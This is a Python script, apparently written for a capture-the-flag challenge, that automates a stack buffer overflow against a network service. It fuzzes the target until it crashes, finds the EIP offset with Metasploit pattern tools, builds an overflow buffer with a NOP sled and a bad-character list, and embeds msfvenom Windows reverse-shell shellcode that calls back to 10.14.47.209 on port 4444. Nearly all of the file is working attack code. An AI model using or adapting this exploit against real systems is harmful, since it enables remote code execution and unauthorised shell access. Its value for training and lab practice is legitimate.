#!/usr/bin/env python3
##################################################
##@JOCKMEDLINUX @ 2023-01-08 - jml-bo.py	##
## A BUFFER OVERFLOW AUTOMIZATION SCRIPT I	##
## WROTE FOR A CHALLENGE I HAVE FORGOTTEN	##
##################################################
import os,sys,subprocess,socket,argparse,time
parser = argparse.ArgumentParser(description='Helping script for buffer overflows by @jockemedlinux')
parser.add_argument('-H', type=str, default='127.0.0.1', help='Host "IP"', required=True)
parser.add_argument('-P', type=int, default='1337', help='Port', required=True)
parser.add_argument('-F', action='store_true', help='Fuzz the binary')
parser.add_argument('-B', action='store_true', help='Send the buffer')
parser.add_argument('-O', action='store_true', help='Find the offset')
args = parser.parse_args()

# // FUN STUFF
cowsending = subprocess.getoutput("echo 'Sending beezneez:::' | cowsay")
cowsent = subprocess.getoutput("echo ':::Beezneez sent' | cowsay")
cowcheck = subprocess.getoutput("echo 'Is it even running, guy?' | cowsay")
cowfail = subprocess.getoutput("echo 'Messing up the IP-address.. wow' | cowsay -e '><'")
cowcyc = subprocess.getoutput("echo 'Wow.. really?' | cowsay -e '><'")
cowquit	= subprocess.getoutput("echo 'Quitter..' | cowsay -d")
cowprofit = subprocess.getoutput("echo 'Did we get it?' | cowsay -e '0o'")
timeout = 5

# // MALICIOUS SHELLCODE TO RUN | #IDENTIFIED BAD CHARACTERS HERE --> [ "" ]
# // Payload : msfvenom -p windows/shell_reverse_tcp LHOST=10.14.47.209 LPORT=4444 EXITFUNC=thread -b "" -f c
shellcode = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x62\xde\x16\x22\x83\xee\xfc\xe2\xf4\x9e\x36\x94\x22"
"\x62\xde\x76\xab\x87\xef\xd6\x46\xe9\x8e\x26\xa9\x30\xd2"
"\x9d\x70\x76\x55\x64\x0a\x6d\x69\x5c\x04\x53\x21\xba\x1e"
"\x03\xa2\x14\x0e\x42\x1f\xd9\x2f\x63\x19\xf4\xd0\x30\x89"
"\x9d\x70\x72\x55\x5c\x1e\xe9\x92\x07\x5a\x81\x96\x17\xf3"
"\x33\x55\x4f\x02\x63\x0d\x9d\x6b\x7a\x3d\x2c\x6b\xe9\xea"
"\x9d\x23\xb4\xef\xe9\x8e\xa3\x11\x1b\x23\xa5\xe6\xf6\x57"
"\x94\xdd\x6b\xda\x59\xa3\x32\x57\x86\x86\x9d\x7a\x46\xdf"
"\xc5\x44\xe9\xd2\x5d\xa9\x3a\xc2\x17\xf1\xe9\xda\x9d\x23"
"\xb2\x57\x52\x06\x46\x85\x4d\x43\x3b\x84\x47\xdd\x82\x81"
"\x49\x78\xe9\xcc\xfd\xaf\x3f\xb6\x25\x10\x62\xde\x7e\x55"
"\x11\xec\x49\x76\x0a\x92\x61\x04\x65\x21\xc3\x9a\xf2\xdf"
"\x16\x22\x4b\x1a\x42\x72\x0a\xf7\x96\x49\x62\x21\xc3\x72"
"\x32\x8e\x46\x62\x32\x9e\x46\x4a\x88\xd1\xc9\xc2\x9d\x0b"
"\x81\x48\x67\xb6\x1c\x2c\x4d\x0f\x7e\x20\x62\xcf\x4a\xab"
"\x84\xb4\x06\x74\x35\xb6\x8f\x87\x16\xbf\xe9\xf7\xe7\x1e"
"\x62\x2e\x9d\x90\x1e\x57\x8e\xb6\xe6\x97\xc0\x88\xe9\xf7"
"\x0a\xbd\x7b\x46\x62\x57\xf5\x75\x35\x89\x27\xd4\x08\xcc"
"\x4f\x74\x80\x23\x70\xe5\x26\xfa\x2a\x23\x63\x53\x52\x06"
"\x72\x18\x16\x66\x36\x8e\x40\x74\x34\x98\x40\x6c\x34\x88"
"\x45\x74\x0a\xa7\xda\x1d\xe4\x21\xc3\xab\x82\x90\x40\x64"
"\x9d\xee\x7e\x2a\xe5\xc3\x76\xdd\xb7\x65\xf6\x3f\x48\xd4"
"\x7e\x84\xf7\x63\x8b\xdd\xb7\xe2\x10\x5e\x68\x5e\xed\xc2"
"\x17\xdb\xad\x65\x71\xac\x79\x48\x62\x8d\xe9\xf7")

# // BUFFER VARIABLES
prefix = ""							#SPECIAL PREFIX?
string = prefix + "A" * 100			#FUZZER STRING. MAKE SURE YOU UPDATE THIS
offset = 272						#THE FOUND OFFSET
As = "A" * offset					#OVERFLOW
Bs = "BBBB"							#EIP-CONTROL
Cs = "CCCC" * 30000					#USE WHEN CHECKING FOR STACK SIZE
retn = ""							#[ADDRESS:"" | LITTLEENDIAN: ""] (JMP-ESP OR PUSH-ESP)
nops = "\x90" * 16					#\x90 (NOP-sled) #NO-OPERATION
nb = "\x00"							#\x00 (Nullbyte)

# // CYCLIC BRAKEPOINT.[ADDRESS:"" | LE:"" ]
cyclic = ""
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# // THE BUFFER
#####################
buffer = ""
# buffer += prefix
buffer += As
buffer += Bs
# buffer += Cs
# buffer += retn
# buffer += nops
#buffer += cyclic
# buffer += badchars
# buffer += shellcode
buffer += nb
#####################

# // FUNCITONS
def close():
	print("\nProgram closing.")
	print(cowquit)
	sys.exit()
def crash():
	print(cowprofit)
	sys.exit()
def run():
	print(cowfail)
	sys.exit()
def check():
	print(cowcheck)
	sys.exit()
def check2():
	print(cowcyc)
def pattern_create(pattern):
	pattern_create = subprocess.getoutput("msf-pattern_create -l %s" % pattern)
	print(pattern_create)
def pattern_offset():
	while True:
		try:
			address = input("[+] What is the EIP-address?: ")
			if address:
				print(f"[+] Searching for EIP-address '{address}' i cyclic pattern.")
				pattern_offset = subprocess.getoutput("msf-pattern_offset -q %s" % address)
				print(pattern_offset)
				break
			else:
				check2()
				print("\nSupply the address?")
		except KeyboardInterrupt:
			close()
		except:
			print("k?")
def fuzzer():
	global prefix
	global string
	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				cyclic = len(string) - len(prefix)
				s.settimeout(timeout)
				s.connect((args.H, args.P))
				s.recv(1024)
				print("Fuzzing with %s bytes" % cyclic)
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except KeyboardInterrupt:
			close()
		except socket.gaierror as e:
			print(f'Error: {e}')
			run()
		except socket.error as e2:
			if len(string) - len(prefix) > 100:
				print(f'\nError:{e2}')
				print(f'You seem to have crashed it.')
				print("Fuzzer crashed at %s bytes" % cyclic)
				print("\nHere is an appropriate cyclic string:\n")
				pattern = (cyclic + 100)
				pattern_create(pattern)
				crash()
			else:
				print(f'Error: {e2}')
				check()
		except:
			print("Fuzzer crashed at %s bytes" % cyclic)
			print("Seems something is wrong..")
			crash()
		string += 100 * "A"
def main():
	global buffer
	global cowsending
	print(cowsending)
	print(bytes(buffer, "latin-1"))
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(0)
			s.connect((args.H, args.P))
			s.recv(1024)
			s.send(bytes(buffer, "latin-1"))
			s.recv(1024)
	except KeyboardInterrupt:
		close()
	except:
		print(cowsent)

# // MAIN PROGRAM
if args.F:
	fuzzer()
elif args.B:
	main()
elif args.O:
	pattern_offset()
else:
	print("\033[1;31;40m \n## You need to use either the Fuzzer (-F) module, the offset (-O) module, or the Buffer (-B) module ##")
	print("\033[1;32;40m")
	parser.print_help()
